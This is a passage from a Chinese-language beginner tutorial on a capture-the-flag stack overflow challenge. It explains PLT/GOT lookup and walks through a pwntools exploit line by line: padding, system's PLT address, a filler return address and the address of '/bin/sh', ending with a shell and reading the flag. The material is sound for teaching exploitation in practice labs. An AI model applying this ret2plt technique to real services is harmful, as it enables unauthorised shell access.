href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022251450.png" title="f" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022251450.png" alt="f"></a></p><p>我们惊喜的发现，在data段(不清楚什么是data段的，请仔细观看谢师傅的视频，为虚拟内存映射的相关知识)中存在字符串&#x2F;bin&#x2F;sh</p><p>拥有这段字符串意味着什么？</p><p>我们知道，函数的执行一般需要参数</p><p>例如system(&#x2F;bin&#x2F;sh)中的&#x2F;bin&#x2F;sh便是system的参数</p><p>所以，我们接下来的任务就是去找到system函数的地址，并且把&#x2F;bin&#x2F;sh这段字符串作为参数，就可以实现system(&#x2F;bin&#x2F;sh)</p><h3 id="plt表和got表"><a href="#plt表和got表" class="headerlink" title="plt表和got表"></a>plt表和got表</h3><p>这里举一个简单的例子</p><p>某公司开发了一款软件，实现的代码调用了大量的函数，这些函数的每次实现都需要在文件(这个软件)中对应的前置来实现他</p><p>这样子就增大了文件的体积</p><p>但是如果将实现这些函数的前置在程序运行时载入到内存中呢？</p><p>这样每一款软件都无需额外的内存占用，并且用户也能成功运行</p><p>所以这里就出现了plt表和got表的概念</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022251871.png" title="g" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022251871.png" alt="g"></a></p><p>当我们需要调用system函数时，他会去自动寻找system的plt表</p><p>其plt表中存储了system函数的got表的地址</p><p>其就是system在libc(libc同样在谢师傅的视频中有所介绍)中的地址</p><p>但是我们在第一次调用system函数的时候，其got表中的地址并不知道system在libc中的哪里</p><p>于是第一次调用无果后，system的plt表便会收到消息，去给got表找到system在libc的位置</p><p>经过原定好的代码实现，plt表便查找到了libc中system的地址，并将其填充给了got表</p><p>接下来plt表再去got表中，他就得知了地址，就可以成功调用system函数</p><p>所以我们可以将整个流程用下图来展示</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022251325.png" title="h" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022251325.png" alt="h"></a></p><p>而在之前程序已经调用了system函数进行echo 字符串，所以我们此时再去system的plt表中就能获取到system在libc中的地址</p><p>这里你可能会无法理解，但是在初期的学习我们只需要记住，plt表是调用该函数，got表中存的地址是为了获得真实地址</p><p>发现漏洞后，接下来就要进行shellcode的编写，开始攻击</p><p>以下shellcode的编写需要python基础，这里同样不做解释，请自行学习）</p><p><del>但我个人是没有进行任何额外的python学习(截止到我学习到堆)，不知道这条路是否合理化，请根据自己在学习中遇到的情况自行斟酌</del></p><h2 id="exp的编写"><a href="#exp的编写" class="headerlink" title="exp的编写"></a>exp的编写</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022251595.png" title="i" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022251595.png" alt="i"></a></p><p><strong>–第二行</strong>建立与靶场的联系(概念不做解释，自行查找)的联系，名称不一定要是io，“ ”中为ip地址，逗号后为端口)</p><p><strong>–第三行</strong>为后续我们获得system的plt表内容的前置条件，括号中为”.&#x2F;文件名”</p><p><strong>–第四行</strong>，接收程序的输出内容，简单的是xxx.recv()  [xxx为你先前命名的名称，比如我的io]</p><p>io.recv()将会接收一行的数据，以\n为结束判定</p><p>而io.recvuntil(“ “)将会接收到” “内的数据才停止，并且包括“ ”内的数据</p><p>如果不想接收“ ”内的数据，可以这样编写io.recvuntil(“hello”,drop &#x3D; True)</p><p>–<strong>第五行</strong>，为变量system_addr赋值</p><p>赋值的内容为system的plt表中的内容</p><p>–<strong>第六行</strong>，编写payload，cyclic创建括号内自定义字长的垃圾数据用来填充ret addr前的内容</p><p>随后我们要注意p32()这个语法，为什么要使用它？</p><p><strong>首先，send系列只能传参字符串，recv接收回来的也只能是字符串，这是因为网络传输的规定!</strong></p><p><strong>所以，对于地址值0x1234，就只有变成字符串传出去</strong></p><p>你应该也能猜到为什么是p32，64位程序使用的便是p64</p><p>接下来我们可以理解p32(0x804a024)就是字符串&#x2F;bin&#x2F;sh的地址，那么中间的0xabcdabc又是什么？</p><p>这里先粗略进行一个介绍，具体的介绍将在后续进行一个专门的文章(可见其中的复杂)</p><p>我们只需要知道，正常的调用system（即非使用call system的汇编代码地址），要想成功为其传参，函数和参数之间要有一个垃圾数据</p><p>所以他的形式可以不为abcdabc可以是任何符合格式的地址</p><p><strong>–第七行</strong>，发送我们构造好的payload，进行栈溢出攻击</p><p>最后，io.interactive()来与终端交互，如果pwn成功，那么我们就可以使用ls来查看当前目录下有哪些文件</p><p>我们利用python3（需要你的虚拟机中安装好了python3）发送这段exp试试</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/k.png" title="k" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/k.png" alt="k"></a></p><p>可以看到我们输入ls后，成功列出了目录的文件，我们发现了一个名为flag的文件，那么这就是我们的最后答案了</p><p>cat flag(liunx使用命令请自行百度) 答案到手！</p><p>在阅读完本文后，相信你对栈溢出的解法已经有了一个大致的理解，接下来请自行前往ctfshow或者其他平台独立解题</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> stack </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
